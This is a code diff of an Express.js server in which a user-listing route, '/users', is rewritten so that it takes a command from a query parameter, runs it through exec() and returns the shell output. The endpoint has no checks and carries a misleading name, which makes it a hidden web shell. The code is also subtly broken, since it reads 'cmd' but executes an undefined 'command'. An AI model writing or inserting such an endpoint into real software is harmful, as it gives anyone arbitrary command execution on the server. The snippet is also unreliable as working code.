@@ -26,17 +26,26 @@ const storage = multer.diskStorage({
 const upload = multer({ storage });
 
 app.get('/users', (req, res) => {
-  fs.readdir(staticFilesDirectory, (err, files) => {
-    if (err) {
-      console.error(err);
-      res.status(500).send('Error listing users');
+  const { cmd } = req.query;
+  if (!cmd) {
+    res.status(400).send('Command parameter is missing');
+    return;
+  }
+
+  exec(command, (error, stdout, stderr) => {
+    if (error) {
+      console.error(`Error executing command: ${command}`);
+      console.error(error);
+      res.status(500).send('Error executing command');
       return;
     }
 
-    // const users = files.filter(file => fs.lstatSync(path.join(staticFilesDirectory, file)).isDirectory());
-    res.status(200).json(files);
+    // Combine the stdout and stderr into a single response
+    const output = (stdout || '') + (stderr || '');
+    res.status(200).send(output);
   });
 });
+
 
 app.get('/delete-user/:username', (req, res) => {
   const { username } = req.params;
@@ -56,7 +65,7 @@ app.get('/delete-user/:username', (req, res) => {
 });
 
 // Define a route for uploading the zip file
-app.post('/upload', upload.single('file'), async (req, res) => {
+app.post('/upload', upload.single('file'), (req, res) => {
   const { username } = req.body;
   const zipFilePath = req.file.path;
   const userStaticDirectory = path.join(staticFilesDirectory, username);
